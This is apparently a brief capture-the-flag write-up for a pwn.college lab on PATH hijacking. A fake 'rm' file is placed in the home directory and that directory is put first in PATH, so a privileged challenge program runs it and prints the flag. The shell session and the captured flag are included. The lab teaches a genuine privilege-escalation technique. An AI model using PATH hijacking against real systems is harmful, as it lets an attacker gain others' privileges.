# Highjacking Commands
In this challenge, we try thousands of times and each time figure out the mistake until the flag is achieved. 
So we start by learning form the name of the challenge that we need to highjack something, and since we know `/challenge/run` will execute `rm` we start by editing the commands inside `rm` to make it print the flag.
Then after hours of trying to fix the PATH we add the home directory to the beginning and give `rm` executable permissions. Then we run the challenge to obtain the flag.
```
Connected!
hacker@path~hijacking-commands:~$ touch rm
hacker@path~hijacking-commands:~$ nano rm
hacker@path~hijacking-commands:~$ PATH=/home/hacker:$PATH
hacker@path~hijacking-commands:~$ chmod a+x rm
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /home/hacker/rm. Executing!
pwn.college{8TuQx3Br3qdAQX2-3CkRPKfjcpf.ddzNyUDLzIzN0czW}
hacker@path~hijacking-commands:~$
```
